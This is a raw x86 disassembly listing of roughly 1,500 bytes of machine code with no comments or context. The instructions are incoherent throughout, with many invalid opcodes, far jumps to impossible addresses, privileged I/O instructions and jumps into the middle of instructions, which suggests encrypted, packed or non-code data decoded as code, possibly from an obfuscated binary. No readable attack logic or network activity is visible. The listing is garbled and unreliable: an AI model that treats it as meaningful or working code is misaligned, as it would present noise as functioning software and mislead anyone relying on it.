  402fe2:	fcom   st(6)
  402fe4:	loope  0x403049
  402fe6:	or     DWORD PTR [ebx],0x6
  402fe9:	mov    edi,?
  402feb:	mov    eax,ds:0xf6cae9b8
  402ff0:	xchg   BYTE PTR [eax+0x7],al
  402ff3:	add    edi,DWORD PTR [esp+eiz*2-0x4a0dcf5f]
  402ffa:	call   0x39352e30
  402fff:	outs   dx,BYTE PTR ds:[esi]
  403000:	test   DWORD PTR [ebx],0xdac2259f
  403006:	mov    dh,0xcf
  403008:	and    al,0xf8
  40300a:	fprem  
  40300c:	jno    0x402fc3
  40300e:	inc    ebp
  40300f:	nop
  403010:	lock bound ebp,QWORD PTR [bp+si-0x459a]
  403016:	std    
  403017:	xor    cl,bl
  403019:	mov    esp,0x1a827bb7
  40301e:	add    bl,al
  403020:	lods   al,BYTE PTR ds:[esi]
  403021:	fsubrp st(1),st
  403023:	or     al,0x5d
  403025:	ret    
  403026:	push   ecx
  403027:	mov    bh,0x76
  403029:	mov    bl,bh
  40302b:	ret    
  40302c:	inc    esi
  40302d:	and    BYTE PTR [edx],dh
  40302f:	mov    bh,0x63
  403031:	adc    eax,0x3c512145
  403036:	retf   
  403037:	jle    0x403093
  403039:	hlt    
  40303a:	mov    gs,WORD PTR [ecx+eiz*4]
  40303d:	rcr    DWORD PTR [esp+edx*4],cl
  403040:	int    0x8f
  403042:	icebp  
  403043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403044:	cli    
  403045:	mov    ch,0xf5
  403047:	xchg   esi,eax
  403048:	shl    BYTE PTR [esp+eiz*2+0x524baf15],cl
  40304f:	out    dx,eax
  403050:	lea    esi,[ebx+0x1b1a67db]
  403056:	push   0x4aae694c
  40305b:	addr16 test eax,0x3d03360c
  403061:	add    bl,BYTE PTR [edx+edx*4-0x2f0fe087]
  403068:	test   al,0xa7
  40306a:	clc    
  40306b:	pop    esi
  40306c:	xchg   ebp,eax
  40306d:	rcr    DWORD PTR [ebx],0x77
  403070:	mov    bh,0xbf
  403072:	mov    dl,0xba
  403074:	dec    ebp
  403075:	jp     0x403079
  403077:	ins    BYTE PTR es:[edi],dx
  403078:	(bad)  
  403079:	adc    ebp,DWORD PTR [esi-0x40ec81a4]
  40307f:	in     eax,dx
  403080:	push   ebp
  403081:	sub    al,0x89
  403083:	repz sub al,0xf3
  403086:	jmp    0x4030bc
  403088:	out    0x42,eax
  40308a:	shr    BYTE PTR ds:0x22df0672,0x20
  403091:	adc    cl,BYTE PTR [ebx]
  403093:	mov    esp,0x999d15a0
  403098:	push   ss
  403099:	mov    edi,ebp
  40309b:	and    ebp,esp
  40309d:	dec    ebx
  40309e:	xor    eax,0x70372552
  4030a3:	(bad)  
  4030a4:	jg     0x40311a
  4030a6:	add    al,0xfa
  4030a8:	pop    ecx
  4030a9:	or     al,0x71
  4030ab:	inc    edi
  4030ac:	mov    BYTE PTR [ebp+eax*2+0x1354ab69],dl
  4030b3:	or     al,0x0
  4030b5:	jmp    0x4030ed
  4030b7:	xor    eax,0xf0a13115
  4030bc:	pushf  
  4030bd:	or     al,0x31
  4030bf:	push   ds
  4030c0:	scas   al,BYTE PTR es:[edi]
  4030c1:	aam    0xbf
  4030c3:	cs int 0x21
  4030c6:	mov    ebp,DWORD PTR [edi+0x7d]
  4030c9:	mov    bh,BYTE PTR [eax+ebx*1]
  4030cc:	test   eax,0xb86c806b
  4030d1:	out    0x81,eax
  4030d3:	jge    0x403087
  4030d5:	jmp    0x67fe:0xace3f7ae
  4030dc:	(bad)  
  4030dd:	mov    esp,?
  4030df:	jl     0x403124
  4030e1:	pop    es
  4030e2:	je     0x4030de
  4030e4:	inc    ecx
  4030e5:	dec    BYTE PTR [ecx-0x17814e4b]
  4030eb:	out    dx,al
  4030ec:	imul   esi,DWORD PTR [edx-0x79ca0b54],0x2ab05c31
  4030f6:	test   DWORD PTR [ebp-0x71e5b75],esp
  4030fc:	cs int3 
  4030fe:	out    dx,al
  4030ff:	loop   0x4030fc
  403101:	and    al,0x54
  403103:	loopne 0x40308a
  403105:	retf   0x1aaa
  403108:	pop    es
  403109:	mov    ds:0xa13d8c00,al
  40310e:	mov    al,0x42
  403110:	sub    DWORD PTR [ecx+0x65d18a71],ecx
  403116:	cmp    ebp,DWORD PTR [ebx+ebp*4]
  403119:	mov    al,ds:0x2cba03ed
  40311e:	add    BYTE PTR [edx-0x397f4a6e],cl
  403124:	fstp   DWORD PTR [eax-0x7ad522ef]
  40312a:	push   cs
  40312b:	ret    0x78db
  40312e:	xor    BYTE PTR [esp+edi*2-0x16dba1e3],0xf5
  403136:	cdq    
  403137:	jae    0x4030c2
  403139:	xor    eax,0x1f180af8
  40313e:	loopne 0x403138
  403140:	xchg   esp,eax
  403141:	js     0x4031a3
  403143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403144:	inc    esp
  403145:	mov    eax,0x93b7e0a
  40314a:	bsf    ecx,DWORD PTR [esi]
  40314d:	adc    al,0xf
  40314f:	mov    ch,0xcc
  403151:	inc    ebp
  403152:	cmp    eax,0x75202fa7
  403157:	jmp    0xa9985175
  40315c:	in     al,dx
  40315d:	sbb    DWORD PTR [ebx],esi
  40315f:	(bad)  
  403160:	ror    ah,cl
  403162:	mov    eax,ds:0x871324ce
  403167:	sub    eax,0xac69ce4f
  40316c:	ret    0xb306
  40316f:	push   ebp
  403170:	ss sbb al,0xc0
  403173:	imul   BYTE PTR [esi]
  403175:	jl     0x40314e
  403177:	or     edi,DWORD PTR [edx-0x10cfa039]
  40317d:	and    eax,0x883718b1
  403182:	mov    edx,DWORD PTR [esi]
  403184:	rcr    BYTE PTR [edx-0x71],0xf4
  403188:	repnz adc esp,DWORD PTR [esi+0x3e]
  40318c:	sbb    ebx,DWORD PTR gs:[ebx]
  40318f:	pop    esp
  403190:	dec    ebx
  403191:	cmp    DWORD PTR [ebp-0x46951276],ebx
  403197:	mov    al,0x4e
  403199:	sahf   
  40319a:	push   0xf07f2602
  40319f:	pop    ds
  4031a0:	jp     0x4031b1
  4031a2:	mov    cl,0xc2
  4031a4:	xchg   edi,eax
  4031a5:	scas   eax,DWORD PTR es:[edi]
  4031a6:	push   0x45
  4031a8:	inc    edx
  4031a9:	mov    eax,0x7df6d152
  4031ae:	jae    0x403180
  4031b0:	jg     0x403161
  4031b2:	jo     0x403156
  4031b4:	mov    al,0x8d
  4031b6:	inc    edi
  4031b7:	das    
  4031b8:	inc    ecx
  4031b9:	ins    DWORD PTR es:[edi],dx
  4031ba:	jle    0x403145
  4031bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031bd:	pop    esp
  4031be:	pop    ds
  4031bf:	ret    0xe0a7
  4031c2:	xor    eax,0x2ebf78ad
  4031c7:	lods   al,BYTE PTR ds:[esi]
  4031c8:	jnp    0x403152
  4031ca:	xor    al,0x28
  4031cc:	test   BYTE PTR [esi+0x45002cce],dl
  4031d2:	dec    eax
  4031d3:	cli    
  4031d4:	pop    ebx
  4031d5:	scas   al,BYTE PTR es:[edi]
  4031d6:	aas    
  4031d7:	push   eax
  4031d8:	lods   eax,DWORD PTR ds:[esi]
  4031d9:	and    BYTE PTR [edx-0x3738b6d2],0xd4
  4031e0:	dec    ebp
  4031e1:	mov    ecx,DWORD PTR [edi]
  4031e3:	mov    ecx,ebx
  4031e5:	sbb    al,0xf4
  4031e7:	iret   
  4031e8:	js     0x403227
  4031ea:	xchg   DWORD PTR [ecx],edx
  4031ec:	mov    esp,0x91cf050a
  4031f1:	sbb    dh,cl
  4031f3:	mov    cl,0xa
  4031f5:	imul   ecx,DWORD PTR [edx],0xffffffd9
  4031f8:	dec    esi
  4031f9:	enter  0xfd75,0x2
  4031fd:	dec    edx
  4031fe:	(bad)  
  4031ff:	and    eax,0x652e9695
  403204:	pop    edi
  403205:	sub    eax,eax
  403207:	jecxz  0x4031c8
  403209:	pop    edx
  40320a:	(bad)  
  40320b:	pop    edi
  40320c:	xchg   edi,eax
  40320d:	xor    eax,DWORD PTR ds:0xedc082a0
  403213:	es mov cl,0xd
  403216:	rol    DWORD PTR [edi],cl
  403218:	(bad)  
  403219:	cld    
  40321a:	xchg   ebp,eax
  40321b:	in     al,dx
  40321c:	push   es
  40321d:	lods   al,BYTE PTR ds:[esi]
  40321e:	fdiv   DWORD PTR [edi+eiz*8-0x44]
  403222:	xchg   edi,eax
  403223:	pop    ebp
  403224:	mov    esp,0x759ef728
  403229:	and    eax,0xa60ac1c1
  40322e:	mov    ah,0x14
  403230:	adc    dl,BYTE PTR [ebp+eax*2+0x35]
  403234:	add    eax,0x763e19e6
  403239:	lahf   
  40323a:	test   eax,0x18f127cb
  40323f:	adc    eax,0x219af6e7
  403244:	sbb    DWORD PTR [eax+0x4a],0x1a
  403248:	sbb    edx,DWORD PTR ds:0xb73a3177
  40324e:	mov    cl,0xe1
  403250:	ins    DWORD PTR es:[edi],dx
  403251:	clc    
  403252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403253:	jp     0x403244
  403255:	je     0x403258
  403257:	stc    
  403258:	mov    ecx,0xc7e8cc90
  40325d:	sbb    DWORD PTR [edi-0x23],0x34
  403261:	frstor [esi+0x63]
  403264:	fadd   DWORD PTR [esi-0x4d42be85]
  40326a:	pop    edi
  40326b:	xchg   esi,eax
  40326c:	pop    ds
  40326d:	or     DWORD PTR [ebp+0x6e5e17a9],esi
  403273:	mov    bl,0x6c
  403275:	mov    ds:0x6634eb9c,al
  40327a:	xor    al,0xe9
  40327c:	xlat   BYTE PTR ds:[ebx]
  40327d:	loope  0x403250
  40327f:	lods   al,BYTE PTR ds:[esi]
  403280:	mov    ecx,eax
  403282:	lods   eax,DWORD PTR ds:[esi]
  403283:	xchg   edi,eax
  403284:	jns    0x403245
  403286:	out    dx,al
  403287:	outs   dx,BYTE PTR ds:[esi]
  403288:	ja     0x403220
  40328a:	sbb    esp,edx
  40328c:	cli    
  40328d:	sub    eax,0xc643c0f0
  403292:	and    dl,ah
  403294:	and    eax,0x852a34e
  403299:	cmp    DWORD PTR [ebx],ebp
  40329b:	sub    bl,BYTE PTR [edi-0x52459925]
  4032a1:	mov    edx,es
  4032a3:	into   
  4032a4:	test   DWORD PTR [ecx],ecx
  4032a6:	sar    DWORD PTR [ebp-0x58],1
  4032a9:	or     ebp,DWORD PTR [eax]
  4032ab:	jmp    0x1952:0xad5458d9
  4032b2:	jnp    0x40323a
  4032b4:	xlat   BYTE PTR ds:[ebx]
  4032b5:	addr16 mov ds:0xe80,eax
  4032b9:	stc    
  4032ba:	int    0x6d
  4032bc:	(bad)  
  4032bd:	icebp  
  4032be:	xor    DWORD PTR [edx],ebp
  4032c0:	mov    ebp,0xb529025c
  4032c5:	pop    esp
  4032c6:	shr    DWORD PTR [esi],cl
  4032c8:	call   0xad0186c
  4032cd:	ret    
  4032ce:	test   dl,dh
  4032d0:	inc    edi
  4032d1:	jb     0x403291
  4032d3:	aam    0xb6
  4032d5:	mov    ds,WORD PTR [edx-0x505547a]
  4032db:	sar    BYTE PTR [edi+eiz*1+0x14372eb8],0x2f
  4032e3:	sbb    BYTE PTR [edi+0x7a9c62ac],ch
  4032e9:	pop    es
  4032ea:	sub    ebx,DWORD PTR ds:0xdca32120
  4032f0:	loope  0x4032e2
  4032f2:	xor    ecx,0xffffffe6
  4032f5:	pop    ebp
  4032f6:	add    al,0x3
  4032f8:	push   esi
  4032f9:	(bad)  
  4032fa:	in     eax,0x10
  4032fc:	bound  ebp,QWORD PTR [bp+di-0x16f0]
  403301:	mov    ds:0x2b45faf7,eax
  403306:	pushf  
  403307:	add    edx,eax
  403309:	jecxz  0x403321
  40330b:	arpl   WORD PTR [eax+eiz*2],si
  40330e:	mov    ds:0xc1240d86,al
  403313:	sbb    edi,DWORD PTR [edx+eiz*4-0x3d]
  403317:	push   ebp
  403318:	gs mov bh,0xd6
  40331b:	fcomp  DWORD PTR [esp+ecx*1]
  40331e:	(bad)  
  40331f:	jmp    0xd10a:0x7224bbc5
  403326:	sbb    BYTE PTR [esp+edi*1+0x2c6e571f],0x62
  40332e:	and    BYTE PTR ds:[eax-0x1],al
  403332:	xchg   ecx,eax
  403333:	shl    BYTE PTR [ecx+eax*2+0x3e8cccc0],cl
  40333a:	sbb    DWORD PTR ds:0x566022fe,0xffffffa5
  403341:	xlat   BYTE PTR ds:[ebx]
  403342:	or     al,0xfe
  403344:	fstp   DWORD PTR [edi]
  403346:	lods   eax,DWORD PTR ds:[esi]
  403347:	mov    bl,0x61
  403349:	pop    eax
  40334a:	xchg   edi,eax
  40334b:	mov    al,0x49
  40334d:	mov    ebx,DWORD PTR [esi-0x4bc3007]
  403353:	sbb    al,0x13
  403355:	adc    cl,BYTE PTR [ebp-0x75995126]
  40335b:	mov    esp,0x24a607b2
  403360:	and    ah,dl
  403362:	shr    bh,0xff
  403365:	outs   dx,DWORD PTR ds:[esi]
  403366:	shl    dh,1
  403368:	or     al,0x9a
  40336a:	div    DWORD PTR [ecx-0x3b57ba52]
  403370:	xor    eax,0x23123200
  403375:	ret    0xff42
  403378:	test   BYTE PTR gs:[ebx+esi*8],al
  40337c:	dec    ebx
  40337d:	dec    esi
  40337e:	clc    
  40337f:	daa    
  403380:	mov    eax,ds:0x18888c6b
  403385:	mov    cl,0x7d
  403387:	inc    ebp
  403388:	and    eax,DWORD PTR [esi-0x42ea30b7]
  40338e:	out    0xff,al
  403390:	dec    esp
  403391:	pop    ecx
  403392:	fiadd  DWORD PTR [ebx]
  403394:	jae    0x4033ae
  403396:	xchg   esi,eax
  403397:	mov    bl,0x4e
  403399:	mov    dh,0x57
  40339b:	and    edx,DWORD PTR [eax]
  40339d:	imul   ecx,eax,0x7c
  4033a0:	jnp    0x403332
  4033a2:	and    edi,ebp
  4033a4:	and    eax,0xce916c84
  4033a9:	xor    esi,DWORD PTR [eax-0x25]
  4033ac:	dec    esp
  4033ad:	lods   al,BYTE PTR ds:[esi]
  4033ae:	retf   
  4033af:	sbb    al,0x80
  4033b1:	inc    eax
  4033b2:	mov    ds:0x5d19afe7,al
  4033b7:	push   ecx
  4033b8:	imul   ecx,DWORD PTR [esi+0x64cde13d],0x653387b6
  4033c2:	into   
  4033c3:	dec    ecx
  4033c4:	sub    ch,bl
  4033c6:	ror    BYTE PTR [ecx+0x70b542d],0xfd
  4033cd:	pop    edi
  4033ce:	(bad)  
  4033cf:	fild   WORD PTR [ecx+0x44]
  4033d2:	dec    ecx
  4033d3:	rcl    BYTE PTR [edi],1
  4033d5:	inc    esp
  4033d6:	sbb    ebp,ebx
  4033d8:	outs   dx,BYTE PTR ds:[esi]
  4033d9:	xchg   edi,eax
  4033da:	push   cs
  4033db:	inc    esp
  4033dc:	idiv   DWORD PTR [eax]
  4033de:	add    ecx,DWORD PTR [edx-0x3b]
  4033e1:	pop    esp
  4033e2:	dec    ecx
  4033e3:	inc    ebx
  4033e4:	scas   al,BYTE PTR es:[edi]
  4033e5:	(bad)  [esp+edi*1-0x2e5fb8ea]
  4033ec:	xchg   eax,eax
  4033ee:	lock neg BYTE PTR [esi]
  4033f1:	xchg   ebp,eax
  4033f2:	adc    DWORD PTR [ebp-0x1b],eax
  4033f5:	xchg   ah,bl
  4033f7:	sub    ebx,DWORD PTR [ebx]
  4033f9:	mov    cl,BYTE PTR [edx+0x7a4090f9]
  4033ff:	fidivr DWORD PTR [edx-0x5b320578]
  403405:	mov    al,0x24
  403407:	jmp    0x403464
  403409:	mov    ds,WORD PTR [edx-0x3f6f0b05]
  40340f:	sbb    BYTE PTR [esi],dl
  403411:	fwait
  403412:	(bad)  
  403414:	adc    ch,cl
  403416:	sub    al,0x48
  403418:	mov    BYTE PTR [esi],dl
  40341a:	jmp    0xb4d4d105
  40341f:	das    
  403420:	dec    dh
  403422:	ins    DWORD PTR es:[edi],dx
  403423:	cmp    dh,cl
  403425:	les    ebp,FWORD PTR [ecx-0x5a]
  403428:	push   eax
  403429:	mov    al,BYTE PTR [ebx-0x49a3e8e9]
  40342f:	dec    ebx
  403430:	xor    al,0x4f
  403432:	add    BYTE PTR [eax+0x50],0xe6
  403436:	jae    0x403437
  403438:	xchg   ebx,eax
  403439:	xor    DWORD PTR [ecx-0x73],esp
  40343c:	pop    edx
  40343d:	in     al,0x8b
  40343f:	jmp    0x403492
  403441:	mov    cl,0xa6
  403443:	mov    ah,0x3e
  403445:	mov    eax,0xbb9718e0
  40344a:	loop   0x403422
  40344c:	pop    esp
  40344d:	and    al,BYTE PTR [esp+esi*1]
  403450:	jl     0x403492
  403452:	(bad)  
  403453:	xchg   edx,eax
  403454:	xor    eax,0xb5b62bc8
  403459:	lods   eax,DWORD PTR ds:[esi]
  40345a:	std    
  40345b:	xor    ah,BYTE PTR [edx]
  40345d:	mov    ebp,0x4d5cef9c
  403462:	mov    dl,0xe1
  403464:	mov    DWORD PTR [esi+0x4d8b45f3],0xe0ddfb5a
  40346e:	mov    dh,0xd0
  403470:	jmp    0x4033f7
  403472:	or     dh,BYTE PTR [edi+0x2b851d33]
  403478:	pop    eax
  403479:	cli    
  40347a:	jecxz  0x403457
  40347c:	mov    esi,0xe5b70ff
  403481:	loop   0x403493
  403483:	fisubr DWORD PTR [ebx]
  403485:	cwde   
  403486:	xor    DWORD PTR [ecx-0x7cfa4467],ecx
  40348c:	adc    al,0x70
  40348e:	cli    
  40348f:	cld    
  403490:	cmp    BYTE PTR [esi+0x7417be88],dh
  403496:	or     eax,0xa751172c
  40349b:	jb     0x403480
  40349d:	enter  0x75e,0x46
  4034a1:	pop    edi
  4034a2:	mov    edi,ebx
  4034a4:	std    
  4034a5:	push   edx
  4034a6:	pusha  
  4034a7:	cmp    eax,0xd8731c5d
  4034ac:	jmp    0x4034e9
  4034ae:	aas    
  4034af:	sub    al,0xa5
  4034b1:	fnstcw WORD PTR [esi+0x25]
  4034b4:	sub    bl,BYTE PTR [ebp+0x44]
  4034b7:	(bad)  
  4034b8:	cld    
  4034b9:	adc    al,BYTE PTR [eax]
  4034bb:	call   0xa043:0x127b2f88
  4034c2:	js     0x403488
  4034c4:	xchg   ecx,eax
  4034c5:	mov    edx,0x25e30ad
  4034ca:	lahf   
  4034cb:	or     ah,ah
  4034cd:	retf   
  4034ce:	jae    0x40349e
  4034d0:	add    DWORD PTR [eax-0x3c],esp
  4034d3:	sub    al,BYTE PTR [eax+0x62]
  4034d6:	pop    edi
  4034d7:	xor    ebx,DWORD PTR [ebx+0x6d]
  4034da:	xor    al,0x4f
  4034dc:	pop    ds
  4034dd:	mov    BYTE PTR [edi],bl
  4034df:	shl    DWORD PTR [edi+0x5d],cl
  4034e2:	push   es
  4034e3:	dec    si
  4034e5:	push   ss
  4034e6:	pop    edi
  4034e7:	sti    
  4034e8:	scas   eax,DWORD PTR es:[edi]
  4034e9:	fwait
  4034ea:	xor    BYTE PTR [ecx*2+0x31f2b3f8],0xb5
  4034f2:	inc    esp
  4034f3:	adc    eax,0x11d7066e
  4034f8:	or     ebx,DWORD PTR [ebx+0x4f]
  4034fb:	data16 xchg BYTE PTR [eax+ebx*1],al
  4034ff:	lods   al,BYTE PTR ds:[esi]
  403500:	sub    ch,ch
  403502:	jns    0x4034ee
  403504:	daa    
  403505:	push   0xf359a786
  40350a:	in     al,dx
  40350b:	fsub   DWORD PTR [eax-0x68e04be7]
  403511:	scas   al,BYTE PTR es:[edi]
  403512:	pop    ecx
  403513:	test   eax,0x54b6350b
  403518:	mov    ch,0x81
  40351a:	fwait
  40351b:	ins    BYTE PTR es:[edi],dx
  40351c:	pop    eax
  40351d:	lods   al,BYTE PTR ds:[esi]
  40351e:	pop    es
  40351f:	pop    ds
  403520:	xor    eax,0x7043eaff
  403525:	inc    ebx
  403526:	scas   eax,DWORD PTR es:[edi]
  403527:	lods   al,BYTE PTR ds:[esi]
  403528:	add    eax,DWORD PTR [ebx]
  40352a:	aas    
  40352b:	cmp    ch,BYTE PTR [esi+0xfcbd367]
  403531:	test   eax,0xde3c2f8b
  403536:	xor    eax,0x75d7e7e2
  40353b:	daa    
  40353c:	mov    esi,0x44fe5e56
  403541:	(bad)  
  403542:	cs cwde 
  403544:	(bad)  
  403545:	repnz push ss
  403547:	and    edi,esi
  403549:	mov    ch,BYTE PTR [ebx-0x42]
  40354c:	xor    DWORD PTR [ecx+0xc],ebx
  40354f:	ds jbe 0x40350e
  403552:	xor    DWORD PTR [esi+0x5dd95184],eax
  403558:	sar    DWORD PTR [edi+0x40ce6c32],1
  40355e:	mov    bh,0xc8
  403560:	adc    DWORD PTR [ebx],eax
  403562:	or     DWORD PTR [esi],esp
  403564:	(bad)  
  403565:	xor    eax,DWORD PTR [ebx-0x29]
  403568:	movups XMMWORD PTR [eax+ebx*4+0x3bac9554],xmm3
  403570:	repz mov ebp,0x55c62156
  403576:	popf   
  403577:	nop
  403578:	lock inc edi
  40357a:	and    BYTE PTR [ebx-0x67b20293],dh
  403580:	das    
  403581:	cwde   
  403582:	sbb    eax,0xe395a9a6
  403587:	fst    QWORD PTR [eax+0x2c40bca7]
  40358d:	les    esi,FWORD PTR [esi]
  40358f:	xor    eax,0x71a39d72
  403594:	pop    edx
  403595:	jp     0x403557
  403597:	nop
  403598:	ret    0xba0a
  40359b:	cmp    DWORD PTR [edi-0x51a16f2e],esp
  4035a1:	cli    
  4035a2:	mov    esi,0x63e3f01c
  4035a7:	leave  
  4035a8:	xor    al,0xd9
  4035aa:	push   0x8b0a9d8a
  4035af:	mov    edx,0x442b23bb
  4035b4:	out    dx,eax
  4035b5:	arpl   di,sp
  4035b7:	mov    cl,0xf3
  4035b9:	sahf   
  4035ba:	test   al,0x40
  4035bc:	mov    eax,0x1d514467
  4035c1:	push   ebp
  4035c2:	mov    BYTE PTR [edx-0x10438151],ah
  4035c8:	sub    eax,0x5e5fa162
  4035cd:	and    dl,BYTE PTR [edi-0x5c69f0ad]
  4035d3:	cmp    BYTE PTR [esi+ecx*1],0xce
  4035d7:	inc    ebx
  4035d8:	jmp    0xdaf608db
  4035dd:	call   0x8796:0x14d9ce8a
  4035e4:	lods   eax,DWORD PTR ds:[esi]
  4035e5:	push   ss
  4035e6:	loopne 0x40364b
  4035e8:	inc    ecx
  4035e9:	lahf   
  4035ea:	or     DWORD PTR [edi-0x56],esi
  4035ed:	(bad)
  4035f1:	jb     0x4035d7
  4035f3:	xchg   DWORD PTR [ebx+0xb19bd96],eax
  4035f9:	stos   DWORD PTR es:[edi],eax
  4035fa:	popf   
  4035fb:	fcom   st(1)
  4035fd:	enter  0x878c,0xd2
  403601:	push   0x3fcc8bbe
  403606:	and    eax,0x4ca43133
  40360b:	mov    edi,0xb20ccedb
  403610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403611:	(bad)  
  403612:	sar    bl,1
  403614:	test   eax,0x1318369e
  403619:	bound  esp,QWORD PTR [ebx-0x3a07b45]
  40361f:	add    cl,bh
  403621:	mov    esi,0x9b302ca2
  403626:	xchg   al,dh
  403628:	mov    bl,0x39
  40362a:	xchg   edi,eax
  40362b:	dec    ebx
  40362c:	cmc    
  40362d:	mov    ebx,DWORD PTR [ecx+0x63]
  403630:	adc    DWORD PTR [edi],0x1f
  403633:	mov    edx,0x80ad7cfd
  403638:	dec    ebx
  403639:	inc    esi
  40363a:	pushf  
  40363b:	mov    edi,eax
  40363d:	push   eax
  40363e:	ds add eax,0xc7825c8
  403644:	leave  
  403645:	enter  0x3ea2,0x1a
  403649:	inc    esi
  40364a:	out    dx,al
  40364b:	outs   dx,DWORD PTR ds:[esi]
  40364c:	fadd   st,st(6)
  40364e:	and    eax,0x2705a69
  403653:	mov    WORD PTR [edx+0x1e],gs
  403656:	lock pop ebx
  403658:	and    eax,0x9f8d8d2c
  40365d:	cmp    cl,BYTE PTR [eax+0x6]
  403660:	cmp    al,0xea
  403662:	jmp    0x403639
  403664:	(bad)  
  403665:	aaa    
  403666:	mov    WORD PTR [eax],ss
  403668:	pop    eax
  403669:	xor    edi,ebx
  40366b:	sbb    BYTE PTR [esi],al
  40366d:	fcmovu st,st(6)
  40366f:	add    esi,DWORD PTR [ecx-0x17317acd]
  403675:	mov    al,0x59
  403677:	retf   0xe673
  40367a:	adc    eax,0xae29fd1e
  40367f:	mov    cs,ebp
  403681:	dec    esp
  403682:	ja     0x4036e8
  403684:	pop    edx
  403685:	push   es
  403686:	iretw  
  403688:	scas   al,BYTE PTR es:[edi]
  403689:	jb     0x40360e
  40368b:	(bad)  
  40368d:	add    al,0x59
  40368f:	mov    cl,0x83
  403691:	ret    0x337
  403694:	cmp    ebp,ebp
  403696:	or     al,0xac
  403698:	jle    0x403670
  40369a:	jns    0x40362c
  40369c:	pop    ecx
  40369d:	pop    eax
  40369e:	push   cs
  40369f:	add    eax,0xaa16ad24
  4036a4:	mov    esi,0xc8724c96
  4036a9:	or     cl,BYTE PTR [esi]
  4036ab:	adc    edi,ebp
  4036ad:	sbb    DWORD PTR [edx+0x7bb4124b],edx
  4036b3:	cmc    
  4036b4:	xor    bl,bh
  4036b6:	test   DWORD PTR [esi],eax
  4036b8:	and    BYTE PTR [edi-0x6d],bl
  4036bb:	or     bh,BYTE PTR [ebx-0x50f71d39]
  4036c1:	popf   
  4036c2:	mov    esi,0xe76201ba
  4036c7:	addr16 pop esi
  4036c9:	xchg   ebp,eax
  4036ca:	nop
  4036cb:	pop    esp
  4036cc:	mov    ebx,0x23e5e31a
  4036d1:	dec    ebx
  4036d2:	jmp    0x40374e
  4036d4:	nop
  4036d5:	jo     0x403714
  4036d7:	popa   
  4036d8:	jns    0x40367c
  4036da:	in     eax,0xfe
  4036dc:	rcr    DWORD PTR [eax+0x19324ec6],cl
  4036e2:	ds stos DWORD PTR es:[edi],eax
  4036e4:	dec    ecx
  4036e5:	or     DWORD PTR [esi],edx
  4036e7:	test   bl,ah
  4036e9:	mov    ch,BYTE PTR [edx+ecx*2+0x40]
  4036ed:	in     eax,dx
  4036ee:	xlat   BYTE PTR ds:[ebx]
  4036ef:	cmp    eax,0xa110364d
  4036f4:	push   eax
  4036f5:	repz test BYTE PTR [edx-0x46],al
  4036f9:	or     ebp,ebp
  4036fb:	adc    al,0xd3
  4036fd:	clc    
  4036fe:	xor    DWORD PTR [edi-0x498090ee],ebx
  403704:	mov    ebp,0x34269689
  403709:	xor    DWORD PTR [ecx],ebp
  40370b:	push   0x1d
  40370d:	fstp   QWORD PTR [edx-0x56]
  403710:	add    ebp,DWORD PTR [eax+0x5cc8d2e4]
  403716:	inc    DWORD PTR [edx-0x5f]
  403719:	cdq    
  40371a:	test   DWORD PTR [esi],edi
  40371c:	in     eax,0xea
  40371e:	adc    BYTE PTR [edi+0x75],bl
  403721:	into   
  403722:	push   esi
  403723:	fild   DWORD PTR [ebx+0x1217d2b1]
  403729:	jmp    0xff98:0x333d43b3
  403730:	int3   
  403731:	ret    0x80ce
  403734:	stos   BYTE PTR es:[edi],al
  403735:	loop   0x4036b7
  403737:	xor    eax,0x2b45581e
  40373c:	pop    gs
  40373e:	stc    
  40373f:	cmp    al,0x76
  403741:	add    al,BYTE PTR ds:0x18f197a7
  403747:	xor    edx,DWORD PTR [edx]
  403749:	sbb    ah,BYTE PTR [ebx-0x7fe3c99d]
  40374f:	pop    ds
  403750:	xchg   ebp,eax
  403751:	pop    edx
  403752:	mov    WORD PTR ds:0x724543d,ds
  403758:	lea    eax,[eax-0x34]
  40375b:	sub    BYTE PTR [edx],dh
  40375d:	jb     0x4037ad
  40375f:	xchg   ecx,eax
  403760:	stos   DWORD PTR es:[edi],eax
  403761:	(bad)  
  403762:	das    
  403763:	ja     0x4037af
  403765:	lods   eax,DWORD PTR ds:[esi]
  403766:	xchg   ebp,eax
  403767:	pop    esi
  403768:	popa   
  403769:	je     0x4036f6
  40376b:	fistp  QWORD PTR [edi]
  40376d:	sahf   
  40376e:	lahf   
  40376f:	loopne 0x40372c
  403771:	xor    bh,ah
  403773:	push   edi
  403774:	xor    bl,ch
  403776:	(bad)  
  403777:	or     eax,0x8e4df7a7
  40377c:	addr16 and al,0x96
  40377f:	add    ecx,DWORD PTR [ebx-0x666ba365]
  403785:	mov    bl,0x4a
  403787:	fiadd  DWORD PTR [eax]
  403789:	sub    BYTE PTR [edx-0x4b],al
  40378c:	addr16 ret 
  40378e:	arpl   cx,dx
  403790:	ja     0x40374b
  403792:	fcmove st,st(1)
  403794:	dec    ebx
  403795:	cmp    eax,eax
  403797:	jg     0x4037b1
  403799:	and    ebp,ebx
  40379b:	mov    dh,0x83
  40379d:	sti    
  40379e:	jle    0x40372a
  4037a0:	jmp    0x98abf62d
  4037a5:	ins    BYTE PTR es:[edi],dx
  4037a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037a7:	ret    
  4037a8:	fldenv [esi+ecx*1]
  4037ab:	jmp    0x4ede:0x45c0fc03
  4037b2:	jbe    0x4037b0
  4037b4:	and    esi,ebx
  4037b6:	pop    esi
  4037b7:	pop    ss
  4037b8:	add    al,0x8d
  4037ba:	adc    esi,ebp
  4037bc:	ror    BYTE PTR [ebp+0x54e66f4f],cl
  4037c2:	ins    BYTE PTR es:[edi],dx
  4037c3:	mov    ds,WORD PTR [ecx+eiz*8]
  4037c6:	mov    edi,DWORD PTR [eax-0x6f99b351]
  4037cc:	repz aas 
  4037ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037cf:	aas    
  4037d0:	push   cs
  4037d1:	jle    0x4037ab
  4037d3:	inc    esp
  4037d4:	inc    BYTE PTR [edx]
  4037d6:	inc    edi
  4037d7:	iret   
  4037d8:	dec    edx
  4037d9:	clc    
  4037da:	icebp  
  4037db:	lods   eax,DWORD PTR ds:[esi]
  4037dc:	sbb    eax,eax
  4037de:	call   0xc5b0:0xa94293c7
